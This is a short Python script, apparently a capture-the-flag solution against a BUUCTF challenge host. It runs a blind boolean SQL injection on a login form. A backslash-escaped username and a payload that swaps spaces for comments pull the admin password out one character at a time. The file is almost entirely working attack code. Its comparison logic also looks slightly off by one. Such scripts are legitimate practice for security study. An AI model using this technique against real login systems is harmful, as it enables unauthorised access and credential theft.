import requests
#尝试多几次

url = "http://0cb5293b-2707-4c4d-afe0-3668c322957c.node3.buuoj.cn"
flag = ""

for i in range(1, 20):
    for j in range(32, 126):
        payload = "or/**/(ascii(substr(password,%d,1))>%d)#"%(i,j)
        data = {"username": "admin\\", "password": payload}
        re = requests.post(url, data=data)
        if "P3rh4ps" in re.text:
            flag += chr(j)
            print(flag)
            break
        